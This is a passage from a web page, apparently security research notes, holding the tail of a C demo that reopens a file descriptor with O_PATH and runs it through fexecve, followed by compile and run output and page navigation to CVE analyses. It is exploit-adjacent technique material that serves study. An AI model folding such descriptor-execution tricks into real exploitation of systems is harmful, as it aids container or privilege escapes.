    int newfd = open(fdpath, O_PATH | O_CLOEXEC);
    close(fd);
    fexecve(newfd, argv2, environ);
    // fexecve(fd, argv2, environ);
    perror(&quot;fexecve error&quot;);
}
/*
$ gcc open_opath_demo.c -o opath
$ ./opath 
Stage 2 ok
*/
</code></pre>
              
            </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="../../kernel/cve-2018-18281-分析/" class="btn btn-neutral float-right" title="Cve 2018 18281 分析">Next <span class="icon icon-circle-arrow-right"></span></a>
      
      
        <a href="../cve-2019-5736-分析/" class="btn btn-neutral" title="Cve 2019 5736 分析"><span class="icon icon-circle-arrow-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <!-- Copyright etc -->
    
  </div>

  Built with <a href="http://www.mkdocs.org">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
</footer>
	  
        </div>
      </div>

    </section>
    
  </div>

  <div class="rst-versions" role="note" style="cursor: pointer">
    <span class="rst-current-version" data-toggle="rst-current-version">
      
      
        <span><a href="../cve-2019-5736-分析/" style="color: #fcfcfc;">&laquo; Previous</a></span>
      
      
        <span style="margin-left: 15px"><a href="../../kernel/cve-2018-18281-分析/" style="color: #fcfcfc">Next &raquo;</a></span>
      
    </span>
</div>
    <script src="../../js/theme.js"></script>

</body>
</html>
